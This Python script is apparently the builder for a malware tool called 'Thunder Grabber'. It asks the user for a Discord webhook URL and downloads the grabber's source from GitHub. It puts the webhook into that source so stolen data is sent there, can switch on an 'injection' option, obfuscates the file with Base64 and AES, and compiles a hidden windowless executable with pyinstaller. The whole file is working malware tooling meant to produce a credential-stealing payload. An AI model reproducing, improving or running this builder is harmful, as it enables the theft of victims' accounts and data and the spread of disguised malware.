from asyncore import write
from tkinter import W
import requests
import os
import shutil
from colorama import Fore
import time
from pystyle import Anime, Colorate, Colors, Center, System, Write
from encryption import Base64_encode, AES_encrypt
from os.path import exists

def blue(text):
    os.system(""); fade = "" 
    red = 255
    for line in text.splitlines():
        fade += (f"\033[38;2;{red};0;180m{line}\033[0m\n")
        if not red == 0:
            red -= 20
            if red < 0:
                red = 0
    return fade


def main():
    global tempfolder
    os.system('cls')
    print(blue("""
                                    ████████╗██╗  ██╗██╗   ██╗███╗   ██╗██████╗ ███████╗██████╗      
                                    ╚══██╔══╝██║  ██║██║   ██║████╗  ██║██╔══██╗██╔════╝██╔══██╗     
                                       ██║   ███████║██║   ██║██╔██╗ ██║██║  ██║█████╗  ██████╔╝     
                                       ██║   ██╔══██║██║   ██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗     
                                       ██║   ██║  ██║╚██████╔╝██║ ╚████║██████╔╝███████╗██║  ██║     
                                       ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝
                                             https://github.com/TWIST-X7/Thunder-Grabber     
                                                     Builder For Thunder Grabber
                                                        Made By TWISTX7#9122               
"""))
    webhook = Write.Input("Webhook URL -> ",
                          Colors.purple_to_blue,interval=0.005, input_color=Colors.white)
    Write.Print("Checking Webhbook...\n",Colors.purple_to_red,interval=0.005)
    time.sleep(0.5)
    r = requests.get(webhook)
    if r.status_code == 200:
        Write.Print("Valid Webhook!\n",Colors.green,interval=0.005)
    else:
        Write.Print("Invalid Webhook!\n",Colors.red,interval=0.005)
        Write.Print("Press enter to continue...",Colors.white,interval=0.005)
        input()
        main()
    
    grabbername = Write.Input(f"Grabber name -> ",Colors.purple_to_blue,interval=0.005, input_color=Colors.white)
    tempfolder = os.getenv("temp")+"\\Thunder"
    try:
        os.mkdir(os.path.join(tempfolder))
    except Exception:
        pass
    raw = requests.get('https://raw.githubusercontent.com/TWIST-X7/Thunder-Grabber/main/thunder.py').text
    inj = str(Write.Input(f"Add Injection? (y/n): ", Colors.purple_to_blue,interval=0.005, input_color=Colors.white)).lower()
    if inj == "n":
        with open(f"{tempfolder}\\{grabbername}.py", "w", encoding="utf-8") as f:
            Write.Print(f"No Injection!\n",Colors.purple_to_red,interval=0.005)
            f.write(raw.replace("YOUR_WEBHOOK", webhook))
            f.close()  
    elif inj == "y":
        with open(f"{tempfolder}\\{grabbername}.py", "w", encoding="utf-8") as f:
            Write.Print(f"Injecting...\n",Colors.purple_to_red,interval=0.005)
            f.write(raw.replace("YOUR_WEBHOOK", webhook).replace("YES_NO", "y"))   
            f.close
    enc = Write.Input(f"Encrypt? (y/n): ", Colors.purple_to_blue,interval=0.005, input_color=Colors.white).lower()
    if enc == "y":
        Write.Print(f"Start Encrypting....\n",Colors.purple_to_red,interval=0.005)
        bypassVM = "n"
        key = "10"
        pathenc = f"{tempfolder}\\{grabbername}.py"
        test2 = Base64_encode.Encode()
        test1 = AES_encrypt.Encryptor(key, pathenc,bypassVM)
        test2.encode(pathenc)
        test1.encrypt_file()
        Write.Print(f"Encrypting Completed Successfully!\n",Colors.green,interval=0.005)
    else: Write.Print(f"No Encrypting!\n",Colors.purple_to_red,interval=0.005)    
    Write.Print(f"Checking Requirements...\n",Colors.purple_to_red,interval=0.005)
    os.system("pip install pyinstaller")
    os.system("pip install --upgrade -r requirements.txt")
    filepath = os.getenv("temp")+f"\\Thunder\\{grabbername}.py"
    Write.Print(f"Creating Grabber...\n",Colors.purple_to_red,interval=0.005)
    os.system(f"pyinstaller --onefile --noconsole -i NONE {filepath}")
    try:
        shutil.move(f"{os.getcwd()}\\dist\\{grabbername}.exe", f"{os.getcwd()}\\{grabbername}.exe")
        shutil.rmtree('build')
        shutil.rmtree('dist')
        shutil.rmtree('__pycache__')
    except:
        pass
    os.remove(f'{grabbername}.spec')
    shutil.rmtree(tempfolder)
    if exists(f'{grabbername}.exe'):
        Write.Input(f"{grabbername}.exe Created Successfully\nPress enter to exit...",Colors.green,interval=0.005, input_color=Colors.white)
        exit()
    else:
        Write.Input(f"Error Creating Grabber\nPress enter to exit...",Colors.red,interval=0.005, input_color=Colors.white)
        exit()
main()
         
